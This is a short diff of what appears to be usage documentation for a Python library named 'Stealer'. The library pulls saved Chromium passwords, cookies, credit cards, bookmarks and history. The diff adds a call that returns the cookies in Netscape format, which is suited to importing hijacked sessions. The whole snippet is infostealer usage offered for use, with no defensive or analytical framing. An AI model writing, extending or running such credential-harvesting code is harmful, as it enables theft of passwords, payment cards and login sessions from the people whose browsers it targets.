@@ -22,6 +22,8 @@ passwords = Stealer.Chromium.Passwords.Get()
 bookmarks = Stealer.Chromium.Bookmarks.Get()
 # Returns a list with dictionaries with your chrome cookies
 cookies = Stealer.Chromium.Cookies.Get()
+# Return string with cookies in NetScape format
+netscapeCookies = Stealer.Chromium.Cookies.GetFormatted()
 # Returns a list with dictionaries with your chrome credit cards
 creditcards = Stealer.Chromium.CreditCards.Get()
 # Returns a list with dictionaries with your chrome history
